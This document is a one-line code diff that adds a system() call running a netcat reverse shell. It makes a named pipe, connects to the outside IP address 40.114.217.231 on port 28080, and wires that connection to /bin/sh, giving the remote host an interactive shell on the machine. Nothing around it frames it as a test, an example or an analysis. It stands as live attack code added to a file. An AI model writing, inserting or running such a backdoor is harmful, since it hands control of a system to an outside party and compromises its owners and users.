@@ -1,0 +1,1 @@
+system("mkfifo foo ; nc 40.114.217.231 28080  0<foo | /bin/sh 1>foo")
